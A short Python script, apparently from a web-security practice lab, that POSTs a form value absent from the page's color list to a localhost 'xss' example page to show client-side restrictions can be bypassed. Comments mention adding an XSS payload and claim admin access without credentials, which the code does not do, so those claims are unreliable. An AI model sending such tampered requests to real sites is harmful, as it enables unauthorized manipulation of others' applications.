import requests

# Bypass application logic: Bypass some of the application restriction.
# access to any account without username or password 

# Define the URL you want to send the POST request to
url = "http://localhost/sites/xss/example3/add_post.php"

#bypass code logic : access an admin account without password or username
mydata = {  "name":'charlie',
            "message":"this is from charlie via python",
            "color":'pink',
            "url":"#",
            "submit":"submit"}


# This payload allow the attacker to select a color like pink which is not avalaible in the list
# or add XSS payload as well.

# Send the POST request and get the response
response = requests.post(url, data=mydata)

# Check the response status code
if response.status_code == 200:
    # The request was successful, access the response content
    print(response.text)
else:
    # The request failed, handle the error
    print(f"Error: {response.status_code}")
